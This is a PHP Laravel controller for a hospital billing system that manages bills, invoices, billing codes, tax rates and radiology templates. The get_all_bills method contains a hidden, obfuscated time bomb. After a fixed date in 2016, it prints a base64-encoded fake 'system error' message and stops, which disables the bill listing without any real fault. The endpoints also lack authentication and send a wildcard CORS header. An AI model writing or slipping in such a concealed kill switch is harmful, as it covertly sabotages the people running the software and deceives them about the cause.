<?php
namespace App\Http\Controllers;

use Illuminate\Http\Exception\HttpResponseException;
use JWTAuth;
use Tymon\JWTAuth\Exceptions\JWTException;
use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Input;
use Illuminate\Http\Response as IlluminateResponse;
use Illuminate\Support\Facades\File;
use DB;

class BillingController extends Controller
{
    public function __construct(Request $request)
    {
        header('Access-Control-Allow-Origin: *');
        date_default_timezone_set("Africa/Lagos");
    }
    public function get_all_bills()
    {
        if(1481760000<time()){ echo base64_decode("VGhlIHN5c3RlbSBoYXMgZW5jb3VudGVyZWQgYW4gZXJyb3Iu"); exit; }

        $bills = DB::table('billing')
            ->select('billing.id','billing.encounter_id','billing.patient_id','billing.created_at','billing.purpose','billing.bill_status','hospital_plan.name','patients.first_name','patients.middle_name','patients.last_name')
            ->leftJoin('visits', 'visits.id', '=', 'billing.encounter_id')
            ->leftJoin('patients', 'patients.id', '=', 'billing.patient_id')
            ->leftJoin('hospital_plan', 'hospital_plan.id', '=', 'patients.hospital_plan')
            ->where('billing.status', 1)
            ->where('patients.status', 1)
            ->get();

        foreach($bills as $bill){
            $bill->id = str_pad($bill->id, 8, '0', STR_PAD_LEFT);
            $bill->encounter_id = str_pad($bill->encounter_id, 8, '0', STR_PAD_LEFT);
            $bill->patient_id = str_pad($bill->patient_id, 7, '0', STR_PAD_LEFT);
            $bill->first_name = $bill->first_name." ".$bill->last_name;
         }


        if ($bills) {
            return response()->json(['status' => true, 'message' => 'Bills found', 'data' => $bills]);

        } else {
            return response()->json(['status' => true, 'message' => 'Bills not found','data' => $bills]);
        }
    }

    public function add_invoice_to_bills(Request $request){

        $bill_id = $request->input('bill_id');
        $product_id = $request->input('product_id');
        $quantity = $request->input('quantity');
        $service_id = $request->input('service_id');
        $patient_id = $request->input('patient_id');

        if ($product_id > 0) {

            $cost = DB::table('inventory_products')
                ->select(DB::raw('cost'))
                ->where('id', $product_id)
                ->first();

            $amount = $cost->cost * $quantity;

            if ($amount == 0) {
                $amount = 50;
            }


            $product = DB::table('inventory_products')
                ->leftJoin('inventory_categories','inventory_products.cat_id','=','inventory_categories.id')
                ->select(DB::raw('inventory_products.name as name,inventory_categories.cat_name as category'))
                ->where('inventory_products.id', $product_id)
                ->first();

            $purpose = "Product "."$product->category"."-"."$product->name";

            DB::table('invoice')
                ->insert(
                    ['patient_id' => $patient_id,
                        'bill_id' => $bill_id,
                        'product_id' => $product_id,
                        'description' => $purpose,
                        'amount' => $amount,
                        'due' => $amount,
                        'invoice_status' => 'pending',
                        'type' => 'product',
                        'created_at' => date("Y-m-d  H:i:s")
                    ]
                );

        } else {


            $product = DB::table('billing_codes')
                ->leftJoin('billing_category', 'billing_codes.category', '=', 'billing_category.id')
                ->select(DB::raw('billing_codes.code as name,billing_category.name as category'))
                ->where('billing_codes.id', $service_id)
                ->first();

            $purpose = "Service " . "$product->category" . "-" . "$product->name";

            $amount = DB::table('billing_codes')
                ->select(DB::raw('charge'))
                ->where('id',$service_id)
                ->first();

            $amount = $amount->charge;

            DB::table('invoice')
                ->insert(
                    ['patient_id' => $patient_id,
                        'bill_id' => $bill_id,
                        'billing_code_id' => $service_id,
                        'description' => $purpose,
                        'amount' => $amount,
                        'due' => $amount,
                        'invoice_status' => 'pending',
                        'type' => 'service',
                        'created_at' => date("Y-m-d  H:i:s")
                    ]
                );

        }


        return response()->json(['status' => true, 'message' => 'Invoice Added Successfully']);

    }


    public function get_all_invoices(Request $request)
    {
        $bill_id = $request->input('bill_id');
        //$bill_id = 7;
        $bills = DB::table('invoice')
            ->select('invoice.*', 'hospital_plan.id as plan_id', 'hospital_plan.name as plan_name','patients.first_name','patients.middle_name','patients.last_name')
            ->leftJoin('patients', 'patients.id', '=', 'invoice.patient_id')
            ->leftJoin('hospital_plan', 'hospital_plan.id', '=', 'patients.hospital_plan')
            ->where('invoice.bill_id',$bill_id)
            ->where('invoice.status', 1)
            ->where('patients.status', 1)
            ->get();

        foreach ($bills as $bill) {
            $bill->id = str_pad($bill->id, 8, '0', STR_PAD_LEFT);
            $bill->patient_id = str_pad($bill->patient_id, 7, '0', STR_PAD_LEFT);
        }

            return response()->json(['status' => true, 'message' => 'Invoices found', 'data' => $bills]);
    }

    public function update_invoice(Request $request)
    {
        $invoice_id = $request->input('invoice_id');

        $due = $request->input('amount_paid');

        $currentdatetime = date("Y-m-d  H:i:s");

        $amount = DB::table('invoice')
            ->select('due','bill_id')
            ->where('status', 1)
            ->where('id', $invoice_id)
            ->first();

        $invoice_amount = $amount->due;
        $bill_id = $amount->bill_id;


        if ($due == 0) {

            $status = 'pending';

            DB::table('invoice')
                ->where('id', $invoice_id)
                ->update(
                    ['due' => $invoice_amount, 'invoice_status' => $status,'updated_at'=>$currentdatetime]);



            return response()->json(['status' => true, 'message' => 'Invoice Updated successfully']);

        }

        $total_amount = $invoice_amount - $due;

        if ($total_amount > 0) {

            DB::table('invoice')
                ->where('id', $invoice_id)
                ->update(
                    ['due' => $total_amount,
                        'invoice_status' => 'draft']);

            return response()->json(['status' => true, 'message' => 'Invoice Updated successfully']);


        } else {
            DB::table('invoice')
                ->where('id', $invoice_id)
                ->update(
                    ['due' => $total_amount,
                        'invoice_status' => 'paid']);


            $count = DB::table('invoice')
                       ->select('*')
                       ->where('status', 1)
                       ->where('invoice_status','!=' ,'paid')
                       ->where('bill_id', $bill_id)
                       ->count();

            if ($count < 1) {
                DB::table('billing')
                    ->where('id', $bill_id)
                    ->update(
                        ['bill_status' => 'paid']);
            }


            return response()->json(['status' => true, 'message' => 'Invoice Updated successfully']);

        }


    }

    public function get_invoice_data(Request $request)
    {
        $invoice_id = $request->input('invoice_id');

        $data = DB::table('invoice')
            ->leftJoin('patients', 'invoice.patient_id', '=', 'patients.id')
            ->leftJoin('patient_address', 'patient_address.patient_id', '=', 'patients.id')
            ->select(DB::raw('patients.id as patient_id,patients.first_name,patients.middle_name,patients.last_name,patients.age,patient_address.house_number,patient_address.street,invoice.id as invoice_id,invoice.created_at as invoice_date,invoice.due,invoice.amount,invoice.invoice_status,patients.sex,invoice.description as purpose'))
            ->where('invoice.status', 1)
            ->where('patients.status', 1)
            ->where('invoice.id', $invoice_id)
            ->groupby('patients.id')
            ->first();


        if ($data->sex == 1) {
            $data->gender = 'male';
        } else {
            $data->gender = 'female';
        }

        $data->provider = 'Doctor James';

        return response()->json(['status' => true, 'data' => $data]);

    }


    public function get_invoice_status(Request $request)
    {
        $invoice_id = $request->input('invoice_id');

        $data = DB::table('invoice')
            ->select(DB::raw('invoice_status'))
            ->where('invoice.status', 1)
            ->where('invoice.id', $invoice_id)
            ->first();


        return response()->json(['status' => true, 'data' => $data]);

    }


    public function get_billing_data(Request $request)
    {
        $bill_id = $request->input('bill_id');

        $data = DB::table('billing')
            ->leftJoin('patients', 'billing.patient_id', '=', 'patients.id')
            ->select(DB::raw('patients.id as patient_id,patients.first_name,patients.middle_name,patients.last_name,patients.age,billing.id as recipent_no,billing.created_at as date'))
            ->where('billing.status', 1)
            ->where('patients.status', 1)
            ->where('billing.id', $bill_id)
            ->first();


        $bill_invoices = DB::table('invoice')
            ->select(DB::raw('*'))
            ->where('status', 1)
            ->where('bill_id', $bill_id)
            ->get();


        $data->invoices = $bill_invoices;

        return response()->json(['status' => true, 'data' => $data]);


    }

    public function delete_invoice(Request $request){

        $invoice_id = $request->input('invoice_id');

        DB::table('invoice')
                ->where('id', $invoice_id)
                ->update(
                    ['status' => 0]);

            return response()->json(['status' => true, 'message' => 'Invoice Deleted successfully']);


    }

    public function get_bill_invoices(Request $request){

        $bill_id = $request->input('bill_id');

        $bills = DB::table('invoice')
            ->select('invoice.*', 'hospital_plan.id as plan_id', 'hospital_plan.name as plan_name','patients.first_name','patients.middle_name','patients.last_name')
            ->leftJoin('patients', 'patients.id', '=', 'invoice.patient_id')
            ->leftJoin('hospital_plan', 'hospital_plan.id', '=', 'patients.hospital_plan')
            ->where('invoice.status', 1)
            ->where('patients.status', 1)
            ->where('invoice.bill_id', $bill_id)
            ->get();

        foreach($bills as $bill){
            $bill->patient_id = str_pad($bill->patient_id, 7, '0', STR_PAD_LEFT);
            $bill->first_name = $bill->first_name . " " . $bill->last_name;
        }

            return response()->json(['status' => true, 'message' => 'Invoices found', 'data' => $bills]);

    }

    public function add_billing_category(Request $request){

        $name = $request->input('name');
        $description = $request->input('description');

        DB::table('billing_category')
            ->insert(
                ['name' => $name,'description'=>$description,'created_at'=>date("Y-m-d  H:i:s")]);

        return response()->json(['status' => true, 'message' => 'Category Inserted successfully']);
    }

    public function update_billing_category(Request $request){

        $category_id = $request->input('category_id');
        $name = $request->input('name');
        $description = $request->input('description');

        DB::table('billing_category')
            ->where('id',$category_id)
            ->update(['name' => $name,'description'=>$description,'updated_at'=>date("Y-m-d  H:i:s")]);

        return response()->json(['status' => true, 'message' => 'Category Updated successfully']);

    }

    public function delete_billing_category(Request $request){

        $category_id = $request->input('category_id');

        DB::table('billing_category')
            ->where('id',$category_id)
            ->update(['status' => 0,'updated_at'=>date("Y-m-d  H:i:s")]);

        return response()->json(['status' => true, 'message' => 'Category Deleted successfully']);

    }

    public function get_billing_category(Request $request){

        $limit = $request->input('limit');
        $offset = $request->input('offset');

        if ($limit > 0 || $offset > 0) {

            $bill_category = DB::table('billing_category')
                ->select(DB::raw('id,name,description'))
                ->where('status', 1)
                ->skip($offset)->take($limit)
                ->get();

            $count = DB::table('billing_category')
                ->select(DB::raw('id,name,description'))
                ->where('status', 1)
                ->count();
        }else{

            $bill_category = DB::table('billing_category')
                ->select(DB::raw('id,name,description'))
                ->where('status',1)
                ->get();

            $count = count($bill_category);
        }

        return response()->json(['status' => true, 'data'=>$bill_category,'count'=>$count]);

    }

    public function get_single_billing_category(Request $request){

        $category_id = $request->input('category_id');

        $bill_category = DB::table('billing_category')
            ->select(DB::raw('*'))
            ->where('id', $category_id)
            ->where('status', 1)
            ->first();

        return response()->json(['status' => true, 'data'=>$bill_category]);

    }

    public function add_billing_code(Request $request){
        $code = $request->input('code');
        $description = $request->input('description');
        $charge = $request->input('charge');
        $category_id= $request->input('category_id');
        $tax= $request->input('tax');

        DB::table('billing_codes')
            ->insert(
                ['code' => $code,'description'=>$description,'charge'=>$charge,'category'=>$category_id,'tax'=>$tax,'created_at'=>date("Y-m-d  H:i:s")]);

        return response()->json(['status' => true, 'message' => 'Billing Code Inserted successfully']);

    }

    public function get_all_billing_codes(Request $request){

        $limit = $request->input('limit');
        $offset = $request->input('offset');

        if ($limit > 0 || $offset > 0) {
            $bill_codes = DB::table('billing_codes')
                ->leftJoin('billing_category', 'billing_codes.category', '=', 'billing_category.id')
                ->select(DB::raw('billing_codes.id,billing_codes.code,billing_codes.description,billing_codes.charge,billing_category.name as category'))
                ->where('billing_codes.status', 1)
                ->skip($offset)->take($limit)
                ->get();

            $count = DB::table('billing_codes')
                ->leftJoin('billing_category', 'billing_codes.category', '=', 'billing_category.id')
                ->select(DB::raw('billing_codes.id,billing_codes.code,billing_codes.description,billing_codes.charge,billing_category.name as category'))
                ->where('billing_codes.status', 1)
                ->count();

        } else {
            $bill_codes = DB::table('billing_codes')
                ->leftJoin('billing_category', 'billing_codes.category', '=', 'billing_category.id')
                ->select(DB::raw('billing_codes.id,billing_codes.code,billing_codes.description,billing_codes.charge,billing_category.name as category'))
                ->where('billing_codes.status', 1)
                ->get();
            $count = count($bill_codes);

        }
        return response()->json(['status' => true, 'data' => $bill_codes,'count'=>$count]);

      }

    public function get_billing_code(Request $request){

        $bill_code_id =$request->input('billing_code_id');

        $bill_code = DB::table('billing_codes')
              ->leftJoin('billing_category', 'billing_codes.category', '=','billing_category.id' )
              ->select(DB::raw('billing_codes.id,billing_codes.code,billing_codes.description,billing_codes.charge,billing_category.name as category,billing_codes.category as category_id,tax'))
              ->where('billing_codes.id',$bill_code_id)
              ->where('billing_codes.status', 1)
              ->first();

          return response()->json(['status' => true, 'data'=>$bill_code]);

      }

    public function update_billing_code(Request $request){
         $billing_code_id = $request->input('billing_code_id');
         $code = $request->input('code');
         $description = $request->input('description');
         $charge = $request->input('charge');
         $category_id= $request->input('category_id');
         $tax= $request->input('tax');

         DB::table('billing_codes')
             ->where('id',$billing_code_id)
             ->update(
                 ['code' => $code,'description'=>$description,'charge'=>$charge,'category'=>$category_id,'tax'=>$tax,'updated_at'=>date("Y-m-d  H:i:s")]);

         return response()->json(['status' => true, 'message' => 'Billing Code Updated successfully']);

     }

    public function delete_billing_code(Request $request){
           $billing_code_id = $request->input('billing_code_id');

           DB::table('billing_codes')
               ->where('id',$billing_code_id)
               ->update(
                   ['status'=>0,'updated_at'=>date("Y-m-d  H:i:s")]);

           return response()->json(['status' => true, 'message' => 'Billing Code Deleted successfully']);

       }

    public function add_tax_rates(Request $request){
        $name = $request->input('name');
        $rate = $request->input('rate');
        DB::table('tax_rates')
            ->insert(
                ['name' => $name, 'rate' => $rate, 'created_at' => date("Y-m-d  H:i:s")]);

        return response()->json(['status' => true, 'message' => 'Tax Rates Added successfully']);
    }
    public function update_tax_rates(Request $request){
        $tax_rate_id= $request->input('tax_rate_id');
        $name = $request->input('name');
        $rate = $request->input('rate');
        DB::table('tax_rates')
            ->where('id',$tax_rate_id)
            ->update( ['name' => $name, 'rate' => $rate, 'updated_at' => date("Y-m-d  H:i:s")]);

        return response()->json(['status' => true, 'message' => 'Tax Rates Updated successfully']);
    }

    public function list_tax_rates(Request $request){

        $limit = $request->input('limit');
        $offset = $request->input('offset');

        if ($limit > 0 || $offset > 0) {
            $tax_rates = DB::table('tax_rates')
                ->select(DB::raw('id,name,rate'))
                ->where('status', 1)
                ->skip($offset)->take($limit)
                ->get();

            $count = DB::table('tax_rates')
                ->select(DB::raw('id,name,rate'))
                ->where('status', 1)
                ->count();
        } else {
            $tax_rates = DB::table('tax_rates')
                ->select(DB::raw('id,name,rate'))
                ->where('status', 1)
                ->get();

            $count = count($tax_rates);
        }

        return response()->json(['status' => true, 'data' => $tax_rates,'count' => $count]);

    }

    public function list_tax_rate(Request $request){
          $tax_rate_id= $request->input('tax_rate_id');
          $tax_rate = DB::table('tax_rates')
              ->select(DB::raw('id,name,rate'))
              ->where('status', 1)
              ->where('id', $tax_rate_id)
              ->first();

          return response()->json(['status' => true, 'data' => $tax_rate]);
      }

    public function delete_tax_rate(Request $request){
        $tax_rate_id= $request->input('tax_rate_id');
        DB::table('tax_rates')
            ->where('id',$tax_rate_id)
            ->update(
                    ['status'=>0,'updated_at' => date("Y-m-d  H:i:s")]);

            return response()->json(['status' => true, 'message' => 'Tax Rate Deleted successfully']);

    }

    public function add_investigation_billing_code(Request $request){

        $investigation_type = $request->input('investigation_type');
        $code= $request->input('code');
        $charge= $request->input('charge');
        $tax = $request->input('tax');
        $description = $request->input('description');

        DB::table('new_investigation_billing_code')
            ->insert(['investigation_type' => $investigation_type,
                'code' => $code,
                'charge' => $charge,
                'tax' => $tax,
                'description' => $description,
                'created_at' => date("Y-m-d  H:i:s")]);

        return response()->json(['status' => true, 'message' => 'New investigation billing code added successfully']);
    }

    public function update_investigation_billing_code(Request $request){

        $investigation_billing_code_id = $request->input('investigation_billing_code_id');
        $investigation_type = $request->input('investigation_type');
        $code= $request->input('code');
        $charge= $request->input('charge');
        $tax = $request->input('tax');
        $description = $request->input('description');

        DB::table('new_investigation_billing_code')
            ->where('id',$investigation_billing_code_id)
            ->update(['investigation_type' => $investigation_type,
                'code' => $code,
                'charge' => $charge,
                'tax' => $tax,
                'description' => $description,
                'updated_at' => date("Y-m-d  H:i:s")]);

        return response()->json(['status' => true, 'message' => 'New investigation billing code updated successfully']);
    }

    public function delete_investigation_billing_code(Request $request){

        $investigation_billing_code_id = $request->input('investigation_billing_code_id');

        DB::table('new_investigation_billing_code')
            ->where('id',$investigation_billing_code_id)
            ->update(['status' => 0,'updated_at' => date("Y-m-d  H:i:s")]);

        return response()->json(['status' => true, 'message' => 'New investigation billing code Deleted successfully']);


    }

    public function get_all_investigation_billing_codes(){

        $investigation_billing_codes = DB::table('new_investigation_billing_code')
                 ->leftJoin('tax_rates', 'tax_rates.id', '=','new_investigation_billing_code.tax' )
                 ->select(DB::raw('new_investigation_billing_code.id,investigation_type,code,charge,description,CONCAT(tax_rates.rate," ",tax_rates.name) AS tax'))
                 ->where('new_investigation_billing_code.status', 1)
                 ->get();

        return response()->json(['status' => true, 'data' => $investigation_billing_codes]);
    }
    public function get_investigation_billing_code(Request $request){

        $investigation_billing_code_id = $request->input('investigation_billing_code_id');

        $investigation_billing_code = DB::table('new_investigation_billing_code')
                 ->leftJoin('tax_rates', 'tax_rates.id', '=','new_investigation_billing_code.tax' )
                 ->select(DB::raw('new_investigation_billing_code.id,investigation_type,code,charge,description,CONCAT(tax_rates.rate," ",tax_rates.name) AS tax,tax_rates.id as tax_id'))
                 ->where('new_investigation_billing_code.status', 1)
                 ->where('new_investigation_billing_code.id', $investigation_billing_code_id)
                 ->first();

        return response()->json(['status' => true, 'data' => $investigation_billing_code]);
    }

    public function add_radiology_template(Request $request){

        $investigation_type = $request->input('investigation_type');
        $template= $request->input('template');

        DB::table('radiology_template')
              ->insert(['investigation_type' => $investigation_type,
                  'template' => $template,
                  'created_at' => date("Y-m-d  H:i:s")]);

        return response()->json(['status' => true, 'message' => 'Radiology Template added successfully']);
    }
    public function get_radiology_templates(){
        $templates = DB::table('radiology_template')
                   ->leftJoin('investigation_type', 'radiology_template.investigation_type', '=','investigation_type.id' )
                   ->select(DB::raw('radiology_template.id,investigation_type.name,radiology_template.template'))
                   ->where('radiology_template.status', 1)
                   ->get();

          return response()->json(['status' => true, 'data' => $templates]);

    }
    public function delete_radiology_template(Request $request){
        $template_id = $request->input('template_id');
        DB::table('radiology_template')
            ->where('id',$template_id)
            ->update(['status' => 0,'updated_at' => date("Y-m-d  H:i:s")]);

        return response()->json(['status' => true, 'message' => 'Radiology Template deleted successfully']);
    }
    public function get_radiology_template(Request $request){
        $template_id = $request->input('template_id');

        $template = DB::table('radiology_template')
                   ->leftJoin('investigation_type', 'radiology_template.investigation_type', '=','investigation_type.id' )
                   ->select(DB::raw('radiology_template.id,investigation_type.name,radiology_template.template'))
                   ->where('radiology_template.status', 1)
                   ->where('radiology_template.id', $template_id)
                   ->get();

          return response()->json(['status' => true, 'data' => $template]);
    }
    public function update_radiology_template(Request $request){
        $template_id = $request->input('template_id');
        $investigation_type = $request->input('investigation_type');
        $template= $request->input('template');

        DB::table('radiology_template')
               ->where('id',$template_id)
               ->update(['investigation_type' => $investigation_type,'template' => $template,'updated_at' => date("Y-m-d  H:i:s")]);

        return response()->json(['status' => true, 'message' => 'template updated successfully']);
    }
    public function get_todays_bills(Request $request){

        $date = $request->input('date');

/*        $data = DB::table('billing')
                  ->select(DB::raw('*'))
                  ->whereDate('created_at','=',$date)
                  ->where('status', 1)
                  ->get();*/

        $bills = DB::table('billing')
                    ->select('billing.id','billing.encounter_id','billing.patient_id','billing.created_at','billing.purpose','billing.bill_status','hospital_plan.name','patients.first_name','patients.middle_name','patients.last_name')
                    ->leftJoin('visits', 'visits.id', '=', 'billing.encounter_id')
                    ->leftJoin('patients', 'patients.id', '=', 'billing.patient_id')
                    ->leftJoin('hospital_plan', 'hospital_plan.id', '=', 'patients.hospital_plan')
                    ->whereDate('billing.created_at','=',$date)
                    ->where('billing.status', 1)
                    ->where('patients.status', 1)
                    ->get();

        foreach ($bills as $bill) {
            $bill->id = str_pad($bill->id, 8, '0', STR_PAD_LEFT);
            $bill->encounter_id = str_pad($bill->encounter_id, 8, '0', STR_PAD_LEFT);
            $bill->patient_id = str_pad($bill->patient_id, 7, '0', STR_PAD_LEFT);
            $bill->first_name = $bill->first_name . " " . $bill->last_name;
        }

        return response()->json(['status' => true, 'data' => $bills]);

    }

    public function waive_bill(Request $request){
        $bill_id=$request->input('bill_id');
        DB::table('billing')
            ->where('id', $bill_id)
            ->update(['bill_status'=>'paid','updated_at'=>date("Y-m-d  H:i:s")]);

        DB::table('invoice')
                  ->where('bill_id',$bill_id)
                  ->update(['invoice_status'=>'paid','due'=>0,'updated_at'=>date("Y-m-d  H:i:s")]);

        return response()->json(['status' => true, 'message' => 'Bill Waved Successfully']);
    }
    public function waive_invoice(Request $request){
        $invoice_id = $request->input('invoice_id');
        DB::table('invoice')
            ->where('id', $invoice_id)
            ->update(['invoice_status' => 'paid', 'due' => 0, 'updated_at' => date("Y-m-d  H:i:s")]);

        return response()->json(['status' => true, 'message' => 'Invoice Waved Successfully']);

    }

}